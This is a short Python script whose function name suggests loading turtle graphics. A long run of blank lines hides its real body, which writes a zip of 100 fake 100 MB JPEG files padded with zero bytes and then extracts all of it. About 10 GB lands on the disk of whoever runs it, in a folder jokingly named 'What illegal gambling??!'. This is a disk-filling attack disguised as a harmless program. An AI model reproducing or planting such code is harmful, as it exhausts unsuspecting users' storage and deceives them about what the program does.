import zipfile
import os
import turtle
def laddaturtle():

    


























































    OUTPUT_ZIP = "pictures_10gb.zip"
    
    # 10 GB total, split across files of 100 MB each = 100 files
    NUM_FILES = 100
    FILE_SIZE_BYTES = 100 * 1024 * 1024  # 100 MB per file
    TOTAL_GB = (NUM_FILES * FILE_SIZE_BYTES) / (1024 ** 3)
    
    # Minimal valid JPEG header + repetitive filler — compresses extremely well
    JPEG_HEADER = bytes([
        0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46,
        0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01,
        0x00, 0x01, 0x00, 0x00,
    ])
    JPEG_FOOTER = bytes([0xFF, 0xD9])
    
    # Repetitive payload that compresses to almost nothing
    FILLER = b"\x00" * (FILE_SIZE_BYTES - len(JPEG_HEADER) - len(JPEG_FOOTER))
    FAKE_JPEG = JPEG_HEADER + FILLER + JPEG_FOOTER
    

    with zipfile.ZipFile(OUTPUT_ZIP, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        for i in range(1, NUM_FILES + 1):
            filename = f"pictures/photo_{i:04d}.jpg"
            zf.writestr(filename, FAKE_JPEG)
    
    zip_size_mb = os.path.getsize(OUTPUT_ZIP) / (1024 ** 2)
    #Extraherar zip filen🤩
    with zipfile.ZipFile(OUTPUT_ZIP, "r") as zf:
        zf.extractall("What illegal gambling??!")
